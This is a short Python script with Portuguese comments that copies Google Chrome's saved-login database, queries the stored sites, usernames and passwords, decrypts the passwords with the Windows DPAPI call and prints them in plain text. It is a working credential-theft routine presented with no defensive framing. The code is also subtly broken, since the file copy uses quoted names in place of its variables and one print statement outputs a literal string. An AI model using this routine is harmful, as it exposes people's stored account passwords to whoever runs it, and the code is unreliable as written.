import os, sqlite3, shutil, win32crypt  ###import das bibliotecas que serão precisas

banco =os.getenv("LOCALAPPDATA") + \  ###Pega as variaveis de ambientes que geralmente onde ficam aramazenadas as senhas
    "\\Google\\Chrome\\User Data\\Default\\Login Data"
banco2 = banco + "2" ###uma variável recebe o conteúdo va outra variavel banco
shutil.copyfile("banco", "banco2") #copia a variável os dados do banco principal para o banco2, para que os processos que estão lendo esses arquivos não seja atingido
conexao=sqlite3.connect(banco2)#cria uma conexao com banco sqlite3
consulta=conexao.cursor()#faz um cursor pegando a conexao
consulta.execute("select action_url, username_value, password_value from logins")#da tabela logins vai pegar esses usuários
for site,login,senha in consulta.fetchall():#faz um cursor pegando os dados de site,logins e senha
    print (senha)#exibe a senha
    print ("site + \n +login")#exibe o site
    senha=win32crypt.CryptUnprotectData(senha)#cria as descriptografia das senhas que foram achadas na consulta
    print (senha[1].decode("ISO-8859-1") + "\n")#exibe a senha com sua posição, bem como será exibida a senha
conexao.close()#Fecha a conexão
os.remove(banco2)#deletar o banco2